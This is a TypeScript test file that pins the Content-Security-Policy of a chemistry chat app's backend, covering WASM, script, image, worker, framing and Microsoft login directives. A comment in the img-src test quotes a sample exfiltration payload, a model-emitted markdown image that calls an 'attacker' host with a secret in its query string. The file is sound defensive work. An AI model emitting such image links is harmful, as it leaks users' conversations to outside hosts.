/**
 * The Content-Security-Policy the BFF sends, asserted directive by directive.
 *
 * `buildCsp` had no test of any kind. `tests/serverConfig.test.ts` is fourteen good cases about
 * `AUTH_MODE` and loopback binding, and its base fixture sets `csp: ''` — so the string that
 * decides whether chemistry renders at all, and whether the XSS defence holds, was produced by one
 * function and read by nobody.
 *
 * Three breakages this closes, each of which left the whole suite green and each of which fails
 * **only in the container** — Vite's dev server serves `index.html` itself and never sends this
 * header, so `:5173` cannot show you any of them:
 *
 *  - dropping `'wasm-unsafe-eval'`: RDKit and Ketcher's Indigo worker both refuse to instantiate,
 *    every structure falls to the "could not render" box and the sketcher dies on first use;
 *  - adding `'unsafe-inline'` to `script-src`: the reason `/config.js` is a real same-origin file
 *    rather than an inline tag, and the reason `renderConfigScript` escapes `<`, both evaporate;
 *  - the `msal` branch losing `login.microsoftonline.com` from `connect-src`: MSAL's hidden-iframe
 *    silent refresh is blocked, producing what the source calls "a random logout" about an hour
 *    after every login.
 *
 * Driven through `cfg.csp` after a fresh import rather than by exporting `buildCsp`, because the
 * property worth pinning is what this process will actually *send* for a given environment — a
 * helper asserted in isolation would still pass if `cfg` stopped calling it.
 */

import { afterEach, describe, expect, it, vi } from 'vitest';

/** `directive -> its values`, parsed from the header the BFF would send under `env`. */
async function csp(env: Record<string, string> = {}): Promise<Map<string, string[]>> {
  for (const [key, value] of Object.entries(env)) vi.stubEnv(key, value);
  vi.resetModules();
  const { cfg } = await import('../server/config.ts');
  const parsed = new Map<string, string[]>();
  for (const chunk of cfg.csp.split(';')) {
    const [name, ...values] = chunk.trim().split(/\s+/);
    if (name) parsed.set(name, values);
  }
  return parsed;
}

const MSAL = {
  AUTH_MODE: 'msal',
  ENTRA_TENANT_ID: 't',
  ENTRA_CLIENT_ID: 'c',
  API_SCOPE: 'api://c/Chat.Access',
};

const ENTRA_HOST = 'https://login.microsoftonline.com';

afterEach(() => {
  vi.unstubAllEnvs();
  vi.resetModules();
});

describe('script execution', () => {
  it.each([
    ['dev', {}],
    ['msal', MSAL],
  ])('permits WASM and nothing else in %s mode', async (_mode, env) => {
    const directives = await csp(env);
    const scriptSrc = directives.get('script-src') ?? [];

    // Present: the narrow token that lets `WebAssembly.instantiate` run. It appears in exactly one
    // place in this repository — the source that produces it — so nothing else can notice its loss.
    expect(scriptSrc, 'RDKit and Ketcher cannot instantiate without this').toContain(
      "'wasm-unsafe-eval'",
    );
    // Absent: the two tokens that would re-open script injection. `wasm-unsafe-eval` deliberately
    // does neither, which is the whole reason a separate token exists.
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(scriptSrc).not.toContain("'unsafe-eval'");
    expect(scriptSrc).toContain("'self'");
  });

  it.each([
    ['dev', {}],
    ['msal', MSAL],
  ])('pins img-src to local sources only in %s mode', async (_mode, env) => {
    // The last line of defence against conversation exfiltration via a model-emitted
    // `![](https://attacker/?q=<secret>)`. `Markdown.tsx` refuses to render an external `<img>`
    // at all, but this directive is what stops one that slips past it (or any other component)
    // from ever reaching the network. No remote host is permitted; `data:` and `blob:` are the
    // page's own inlined/minted images. Pinned in both auth modes because neither branch touches
    // it — a widening here would be silent otherwise.
    expect(await csp(env).then((d) => d.get('img-src'))).toEqual(["'self'", 'data:', 'blob:']);
  });

  it('states worker-src, which does not fall back to script-src', async () => {
    // Browsers that implement `worker-src` do NOT fall back to `script-src` for it, so an omitted
    // directive is not "inherit" — Ketcher's Indigo worker simply fails on the first operation.
    expect((await csp()).get('worker-src')).toEqual(["'self'"]);
  });

  it('leaves nowhere for an injected object or a rewritten base href', async () => {
    const directives = await csp();
    expect(directives.get('object-src')).toEqual(["'none'"]);
    expect(directives.get('base-uri')).toEqual(["'none'"]);
  });
});

describe('the MSAL branch', () => {
  it('opens exactly the three directives the silent refresh needs', async () => {
    const directives = await csp(MSAL);

    // The hidden iframe has to be created (`frame-src`), has to talk to the login host
    // (`connect-src`), and the redirect has to be allowed to POST back (`form-action`).
    expect(directives.get('connect-src')).toEqual(["'self'", ENTRA_HOST]);
    expect(directives.get('frame-src')).toEqual([ENTRA_HOST]);
    expect(directives.get('form-action')).toEqual(["'self'", ENTRA_HOST]);
  });

  it('does not open them in dev mode, where nothing talks to Entra', async () => {
    // The other direction, and what makes the assertion above mean something: if the login host
    // were unconditional, the msal test would pass with the branch deleted.
    const directives = await csp();
    expect(directives.get('connect-src')).toEqual(["'self'"]);
    expect(directives.get('frame-src')).toEqual(["'none'"]);
    expect(directives.get('form-action')).toEqual(["'self'"]);
  });
});

describe('framing', () => {
  it('is refused unless a deployment opts in', async () => {
    // A dev-mode UI requires no sign-in and opens every authorization gate, so it is the
    // deployment that can least afford to be clickjacked. `ALLOW_FRAMING` is the one knob.
    expect((await csp()).get('frame-ancestors')).toEqual(["'none'"]);
    expect((await csp(MSAL)).get('frame-ancestors')).toEqual(["'none'"]);
  });

  it('is permitted when the deployment says so', async () => {
    expect((await csp({ ALLOW_FRAMING: 'true' })).get('frame-ancestors')).toEqual(['*']);
  });
});
